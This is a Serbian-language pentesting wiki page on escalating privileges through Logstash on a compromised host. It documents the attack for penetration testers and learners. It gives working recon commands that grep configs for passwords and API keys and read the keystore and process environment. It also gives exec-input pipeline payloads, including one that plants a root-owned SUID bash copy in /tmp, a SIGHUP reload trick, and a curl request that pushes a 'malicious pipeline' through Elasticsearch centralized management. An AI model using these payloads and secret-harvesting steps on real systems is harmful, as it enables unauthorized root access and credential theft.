# Podizanje privilegija pomoću Logstash-a

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash se koristi za **prikupljanje, transformaciju i prosleđivanje logova** kroz sistem poznat kao **pipeline**. Ti pipeline-ovi sastoje se od faza **input**, **filter** i **output**.<sup>[[4]](#references)</sup> Zanimljiv slučaj javlja se kada Logstash radi na kompromitovanoj mašini.

### Konfiguracija pipeline-a

Kod instalacija Debian i RPM paketa, pipeline-ovi se konfigurišu putem **/etc/logstash/pipelines.yml**, u kojem su navedene lokacije konfiguracija pipeline-ova; u drugim distribucijama, `pipelines.yml` se nalazi u direktorijumu Logstash `path.settings`.<sup>[[5]](#references)[[6]](#references)</sup>

```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
  path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
  path.config: "/usr/share/logstash/pipeline/1*.conf"
  pipeline.workers: 6
```

Ova datoteka otkriva gde se nalaze **.conf** datoteke koje sadrže konfiguracije pipeline-a. Kada se koristi **Elasticsearch output**, proverite podešavanja `user`/`password`, `cloud_auth` ili `api_key`; efektivne privilegije naloga zavise od Elasticsearch-a. Glob u `path.config` učitava svaku datoteku koja se podudara za taj pipeline.<sup>[[6]](#references)[[7]](#references)[[11]](#references)</sup>

Ako se Logstash pokrene sa `-f <directory>` umesto sa `pipelines.yml`, `-f` ima prednost i **sve datoteke unutar tog direktorijuma se konkateniraju leksikografskim redosledom i parsiraju kao jedna konfiguracija**.<sup>[[6]](#references)[[7]](#references)</sup> Ovo ima 2 ofanzivne implikacije:

- Opuštena datoteka poput `000-input.conf` ili `zzz-output.conf` može da promeni način na koji se sklapa završni pipeline
- Neispravna datoteka može da dovede do neuspešne validacije objedinjene konfiguracije; tokom ponovnog učitavanja Logstash zadržava prethodni pipeline, zato validirajte payload-e pre nego što se oslonite na automatsko ponovno učitavanje.<sup>[[1]](#references)</sup>

### Brzo izviđanje na kompromitovanom hostu

Na mašini na kojoj je instaliran Logstash, brzo proverite:

```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```

Takođe proverite da li je lokalni monitoring API dostupan. Podrazumevano se vezuje za **127.0.0.1:9600**, što je obično dovoljno nakon pristupa hostu.<sup>[[8]](#references)</sup>

```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```

Ove krajnje tačke izlažu ID-jeve i podešavanja pipeline-ova, metrike tokom izvršavanja i brojače uspešnog/neuspešnog ponovnog učitavanja konfiguracije, što pomaže da se potvrdi da li je promena prihvaćena.<sup>[[8]](#references)[[17]](#references)[[18]](#references)</sup>

Ako pronađeni credential cilja **Elasticsearch**, pogledajte [ovu drugu stranicu o Elasticsearch-u](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### File input koji prosleđuje podatke dinamičkom izlazu komande

Korisnik može imati samo read-only pristup konfiguraciji pipeline-a, dok njen [file input](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-file) prati putanju u koju taj korisnik može da upisuje. Pratite učitani pipeline od tog input-a preko eventualnog [Grok hvatanja polja](https://www.elastic.co/docs/reference/logstash/plugins/plugins-filters-grok) do [exec output-a](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-exec). Exec output prosleđuje svoj `command` kroz shell i zamenjuje vrednosti `%{field}` bez sanitizacije shell metakaraktera. Putanja u koju može da se upisuje predstavlja osnov za eskalaciju privilegija samo ako servis radi pod privilegovanijim identitetom, ako fajl korisnika zaista može da dospe u praćeni input, ako filteri i uslovi izlaza usmeravaju njegov sadržaj u polje komande i ako je taj output plugin instaliran i aktivan. Odvojeno proverite dozvole za pretragu direktorijuma i upis, stanje praćenja file input-a i efektivni nalog servisa; tokom pasivnog prikupljanja podataka nemojte pisati probni događaj niti pozivati output.

### Eskalacija privilegija preko pipeline-ova u koje može da se upisuje

Da biste pokušali eskalaciju privilegija, najpre utvrdite pod kojim se korisnikom Logstash servis zaista izvršava; nemojte pretpostavljati da je to root ili korisnik **logstash**. Ispunite **jedan** od sledećih uslova:

- Imate **dozvolu za upisivanje** u fajl pipeline-a **.conf** **ili**
- Fajl **/etc/logstash/pipelines.yml** koristi wildcard, a vi možete da upisujete u ciljnu fasciklu.<sup>[[6]](#references)[[7]](#references)</sup>

Pored toga, mora da bude ispunjen **jedan** od sledećih uslova:

- Možete da restartujete Logstash servis **ili**
- U fajlu **/etc/logstash/logstash.yml** postavljeno je **config.reload.automatic: true**.<sup>[[1]](#references)[[15]](#references)</sup>

Ako konfiguracija sadrži wildcard, kreiranjem fajla koji odgovara tom wildcard-u moguće je izvršiti komandu.<sup>[[7]](#references)[[9]](#references)</sup> Na primer:

```bash
input {
  exec {
    command => "whoami"
    interval => 120
  }
}

output {
  file {
    path => "/tmp/output.log"
    codec => rubydebug
  }
}
```

Ovde, **interval** određuje učestalost izvršavanja u sekundama. U datom primeru, komanda **whoami** pokreće se svakih 120 sekundi, a njen izlaz se upisuje u **/tmp/output.log**.<sup>[[9]](#references)</sup>

Uz **config.reload.automatic: true** u **/etc/logstash/logstash.yml**, Logstash će automatski otkrivati i primenjivati nove ili izmenjene konfiguracije pipeline-a bez potrebe za ponovnim pokretanjem.<sup>[[1]](#references)[[15]](#references)</sup> Ako nema džoker znaka, postojeće konfiguracije i dalje mogu da se menjaju, ali se savetuje oprez kako bi se izbegli prekidi.

### Pouzdaniji payload-i za pipeline

Dodatak za ulaz `exec` i dalje radi u aktuelnim izdanjima i zahteva ili `interval` ili `schedule`. Izvršava se tako što **fork-uje** Logstash JVM, pa ako nema dovoljno memorije, vaš payload može da zakaže sa greškom `ENOMEM` umesto da se neprimetno izvrši.<sup>[[9]](#references)</sup>

Kada servis ima dovoljne privilegije za kreiranje SUID datoteke u vlasništvu root korisnika, praktičan payload za eskalaciju privilegija je onaj koji ostavlja trajan artefakt:

```bash
input {
  exec {
    command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
    interval => 300
  }
}
output {
  null {}
}
```

Ako nemate prava za restart, ali možete da pošaljete signal procesu, Logstash takođe podržava ponovno učitavanje pokrenuto signalom **SIGHUP** na sistemima sličnim Unix-u:<sup>[[1]](#references)</sup>

```bash
kill -SIGHUP $(pgrep -f logstash)
```

Imajte na umu da ne podržava svaki plugin ponovno učitavanje. Na primer, **stdin** input sprečava automatsko ponovno učitavanje, zato nemojte pretpostaviti da će `config.reload.automatic` uvek preuzeti vaše izmene.<sup>[[1]](#references)</sup>

### Krađa tajni iz Logstash-a

Pre nego što se usredsredite samo na izvršavanje koda, prikupite podatke kojima Logstash već ima pristup:

- Akreditivi se mogu nalaziti u `elasticsearch {}` izlazima, URL-ovima/podešavanjima za `http_poller`, JDBC inputima ili podešavanjima vezanim za cloud; ovi plugini izlažu polja sa akreditivima koja vredi pretražiti.<sup>[[11]](#references)[[12]](#references)[[13]](#references)</sup>
- Bezbedna podešavanja mogu se nalaziti u **`/etc/logstash/logstash.keystore`** ili drugom `path.settings` direktorijumu.<sup>[[5]](#references)[[10]](#references)</sup>
- Lozinka za keystore može biti prosleđena kroz **`LOGSTASH_KEYSTORE_PASS`**, a RPM/DEB instalacije učitavaju promenljive okruženja servisa iz **`/etc/sysconfig/logstash`**.<sup>[[10]](#references)</sup>
- Proširivanje promenljivih okruženja pomoću `${VAR}` obavlja se pri pokretanju Logstash-a, pa vredi proveriti okruženje servisa.<sup>[[14]](#references)</sup>

Korisne provere:

```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```

Ovo takođe vredi proveriti jer je **CVE-2023-46672** pokazao da je Logstash, pod određenim okolnostima, beležio osetljive informacije u svojim logovima, uključujući tajne sačuvane u njegovom keystore-u i navedene u konfiguraciji; pregledajte stare Logstash logove i unose u `journald` ako se te okolnosti mogu odnositi na vas.<sup>[[3]](#references)</sup>

### Zloupotreba centralizovanog upravljanja pipeline-ima

U nekim okruženjima, host se uopšte **ne** oslanja na lokalne `.conf` datoteke. Ako je podešeno **`xpack.management.enabled: true`**, Logstash može da preuzima centralno upravljane pipeline-ove iz Elasticsearch/Kibana, a nakon uključivanja ovog režima lokalne konfiguracije pipeline-ova više nisu izvor istine.<sup>[[2]](#references)</sup>

To znači da postoji drugačiji put napada:

1. Pribavite Elastic akreditive iz lokalnih Logstash podešavanja, keystore-a ili logova.<sup>[[3]](#references)[[10]](#references)</sup>
2. Proverite da li nalog ima privilegiju klastera **`manage_logstash_pipelines`**.<sup>[[16]](#references)</sup>
3. Kreirajte ili zamenite centralno upravljani pipeline tako da Logstash host izvrši vaš payload pri sledećem intervalu provere.<sup>[[2]](#references)[[16]](#references)</sup>

Elasticsearch API koji se koristi za ovu funkciju je:<sup>[[16]](#references)</sup>

```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
  -H 'Content-Type: application/json' \
  -u user:password \
  -d '{
    "description": "malicious pipeline",
    "last_modified": "2026-01-02T02:50:51.250Z",
    "username": "user",
    "pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
    "pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
    "pipeline_settings": {
      "pipeline.workers": 1,
      "pipeline.batch.size": 1,
      "pipeline.batch.delay": 50,
      "queue.type": "memory",
      "queue.max_bytes": "1gb",
      "queue.checkpoint.writes": 1024
    }
  }'
```

Ovo je naročito korisno kada su lokalne datoteke samo za čitanje, ali je Logstash već podešen da udaljeno preuzima pipeline-ove.<sup>[[2]](#references)[[16]](#references)</sup>

## References

- [1] [Elastic Docs: Ponovno učitavanje konfiguracione datoteke](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Podešavanje centralizovanog upravljanja pipeline-ovima](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 bezbednosno ažuriranje (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)
- [4] [Elastic Docs: Kreiranje Logstash pipeline-a](https://www.elastic.co/docs/reference/logstash/creating-logstash-pipeline)
- [5] [Elastic Docs: Raspored direktorijuma Logstash-a](https://www.elastic.co/docs/reference/logstash/dir-layout)
- [6] [Elastic Docs: Više pipeline-ova](https://www.elastic.co/docs/reference/logstash/multiple-pipelines)
- [7] [Elastic Docs: Pokretanje Logstash-a iz komandne linije](https://www.elastic.co/docs/reference/logstash/running-logstash-command-line)
- [8] [Elastic Docs: Nadgledanje Logstash-a pomoću API-ja](https://www.elastic.co/docs/reference/logstash/monitoring-logstash)
- [9] [Elastic Docs: Exec ulazni dodatak](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-exec)
- [10] [Elastic Docs: Keystore za tajne vrednosti u bezbednim podešavanjima](https://www.elastic.co/docs/reference/logstash/keystore)
- [11] [Elastic Docs: Elasticsearch izlazni dodatak](https://www.elastic.co/docs/reference/logstash/plugins/plugins-outputs-elasticsearch)
- [12] [Elastic Docs: Http_poller ulazni dodatak](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-http_poller)
- [13] [Elastic Docs: Jdbc ulazni dodatak](https://www.elastic.co/docs/reference/logstash/plugins/plugins-inputs-jdbc)
- [14] [Elastic Docs: Korišćenje promenljivih okruženja](https://www.elastic.co/docs/reference/logstash/environment-variables)
- [15] [Elastic Docs: logstash.yml](https://www.elastic.co/docs/reference/logstash/logstash-settings-file)
- [16] [Elasticsearch API: Kreiranje ili ažuriranje Logstash pipeline-a](https://www.elastic.co/docs/api/doc/elasticsearch/operation/operation-logstash-put-pipeline)
- [17] [Logstash API: Dobavljanje podešavanja za pipeline-ove](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodeinfopipelines)
- [18] [Logstash API: Dobavljanje statistike za pipeline-ove](https://www.elastic.co/docs/api/doc/logstash/operation/operation-nodestatspipelines)
{{#include ../../banners/hacktricks-training.md}}
